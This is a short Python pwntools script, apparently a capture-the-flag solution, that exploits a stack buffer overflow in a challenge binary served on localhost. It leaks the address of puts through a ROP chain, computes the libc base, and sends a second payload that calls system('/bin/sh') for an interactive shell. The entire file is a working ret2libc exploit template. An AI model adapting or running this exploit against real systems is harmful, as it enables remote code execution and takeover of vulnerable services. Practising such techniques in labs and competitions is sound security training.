#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 9993
HOST = "127.0.0.1"
exe = context.binary = ELF('./ret2libc_chall_patched', checksec=False)
libc = ELF('./libc6-amd64_2.31-0ubuntu9.1_i386.so', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

p = remote(HOST, PORT)
# p = exe.process()

pop_rdi = 0x0000000000401263

payload = b'a'*88 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendafter(b'something: \n', payload)

libc_leak = u64(p.recv(6) + b'\0\0')

libc.address = libc_leak - libc.sym['puts']

print("Libc leak: " + hex(libc_leak))
print("Libc base: " + hex(libc.address))
print("bin_shell: " + hex(next(libc.search(b'/bin/sh'))))
# input() 
#Payload
payload = b'a'*88 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
p.sendafter(b'something: \n', payload)
p.interactive()